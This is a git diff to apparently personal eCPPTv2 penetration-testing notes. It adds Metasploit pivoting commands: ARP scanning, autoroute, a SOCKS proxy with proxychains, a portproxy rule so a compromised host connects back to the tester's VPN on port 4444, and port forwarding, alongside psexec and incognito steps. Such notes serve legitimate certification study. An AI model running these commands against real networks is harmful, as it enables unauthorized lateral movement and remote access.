@@ -785,6 +785,19 @@ echo %userdomain%
 ```
 # eCPPTv2
 
+# Pivot
+```bash
+On target
+run arp_scanner -r 10.10.10.0/24
+
+PIVOT
+use post/manage/autoroute
+meterpreter > run autoroute -s 172.30.111.0/24
+meterpreter > background
+msf exploit(psexec) > use auxiliary/scanner/portscan/tcp
+
+```
+
 ##### RECON The Target NET
 ```bash
 ping sweep
@@ -874,11 +887,6 @@ EXPLOIT
 msf > use exploit/windows/smb/psexec
 /home/bruiser/impacket/examples/psexec.py
 
-PIVOT
-meterpreter > run autoroute -s 172.30.111.0/24
-meterpreter > background
-msf exploit(psexec) > use auxiliary/scanner/portscan/tcp
-
 LOAD INCOGNITO
 msf auxiliary(tcp) > sessions -i 1
 meterpreter > use incognito
@@ -929,13 +937,26 @@ run arp_scanner -r 10.10.10.0/24
 ```
 ### USE THE EXPLOITED MACHINE AS A BRIDGE
 ```bash
-use post/windows/manage/autoroute
+use post/manage/autoroute
 route print
-use auxiliary/server/socks4a
+use auxiliary/server/socks_proxy
+     Set our proxy SRVHOST value to be that of our VPN tunnel IP address, and run the module:
 
 sudo nano /etc/proxychains.conf
 (last line) socks4 127.0.0.1 1080
 proxychains iceweasel (for browser)
+
+Now turn on the proxy in the web browser config to the VPN Tunnel address with the correct socks 4a
+Browse like normal
+
+NOW TO GET THE MACHINE TO BE ABLE TO CONNECT BACK TO US
+use post/windows/manage/portproxy
+msf post(windows/manage/portproxy) > set CONNECT_ADDRESS 175.12.80.21 (My VPN)
+msf post(windows/manage/portproxy) > set CONNECT_PORT 4444 (Whatever)
+msf post(windows/manage/portproxy) > set LOCAL_ADDRESS 10.100.11.101 (What machine I am using to pivot)
+msf post(windows/manage/portproxy) > set LOCAL_PORT 4444 (Whatever)
+msf post(windows/manage/portproxy) > set SESSION 1
+msf post(windows/manage/portproxy) > run
 
 ADD PORT FORWARD RULE
 meterpreter > portfwd add -l 8080 -p 80 -r 10.10.10.200 (or whatever you want to get to)
